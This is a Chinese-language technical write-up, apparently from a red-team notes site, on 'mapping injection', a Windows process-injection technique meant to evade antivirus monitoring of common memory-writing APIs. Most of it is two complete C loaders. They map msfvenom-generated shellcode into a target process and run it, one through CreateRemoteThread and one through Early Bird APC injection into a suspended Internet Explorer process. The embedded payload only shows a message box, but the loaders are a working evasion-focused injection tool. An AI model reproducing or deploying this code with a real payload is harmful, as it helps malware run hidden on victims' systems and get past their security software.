---
description: Mapping Injection
---

# Mapping Injection

## [CreateFileMapping-&gt;MapViewOfFile](mapping-injection.md)简介

映射注入是一种内存注入技术，可以避免使用一些经典注入技术使用的API,如VirtualAllocEx,WriteProcessMemory等被杀毒软件严密监控的API，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典写入函数，增加了隐蔽性。

![](../.gitbook/assets/image%20%2818%29.png)

## 注入流程

1. 在注入进程创建mapping
2. 将mapping映射到注入进程虚拟地址
3. 往被映射的虚拟地址写入shellcode
4. 打开被注入进程句柄
5. 将mapping映射到被注入进程虚拟地址
6. 创建远程线程

## 代码实现

PS:CreateFileMapping存在多种用法,并非只有这一种。

```text
#include <windows.h>
#include <stdio.h>
#pragma comment (lib, "OneCore.lib")


//msfvenom -p windows/x64/messagebox -e x64/xor_dynamic -i 15 EXITFUNC=thread  -f c
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
"\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f"
"\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73"
"\x73\x61\x67\x65\x42\x6f\x78\x00";

int main(int argc, char** argv)
{

	

	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);

	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));

	memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 19752);

	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);

	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);

	UnmapViewOfFile(lpMapAddress);
	CloseHandle(hMapping);
	return 0;
}
```

## 扩展与优化

在前面的章节中说过CreateRemoteThread这样敏感的API也会被杀毒软件重点关注，那么我们同时可以使用别的代码执行方式，比如说APC注入和Early Bird等注入技术，mapping注入技术也可以作为一种非常规的shellcode写入技术使用，我们并不用拘泥与常规的使用方式，也可以与已有技术组合出新的代码执行链。

* 与Early Bird技术组合

```text
#include <windows.h>
#include <stdio.h>
#pragma comment (lib, "OneCore.lib")


//msfvenom -p windows/x64/messagebox -e x64/xor_dynamic -i 15 EXITFUNC=thread  -f c
unsigned char shellcode[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d"
"\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
"\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f"
"\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73"
"\x73\x61\x67\x65\x42\x6f\x78\x00";

	int main() {
		STARTUPINFO si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		si.cb = sizeof(STARTUPINFO);
		HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(shellcode), NULL);

		LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, sizeof(shellcode));

		memcpy((PVOID)lpMapAddress, shellcode, sizeof(shellcode));

		CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi);

		LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, pi.hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);

		QueueUserAPC((PAPCFUNC)lpMapAddressRemote, pi.hThread, NULL);
		ResumeThread(pi.hThread);
		CloseHandle(pi.hThread);
		CloseHandle(hMapping);
		UnmapViewOfFile(lpMapAddress);
		return 0;
	}

```

![](../.gitbook/assets/image%20%2817%29.png)

* github:[https://github.com/idiotc4t/Mapping-injection](https://github.com/idiotc4t/Mapping-injection)

## LINKS

{% embed url="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile2" %}



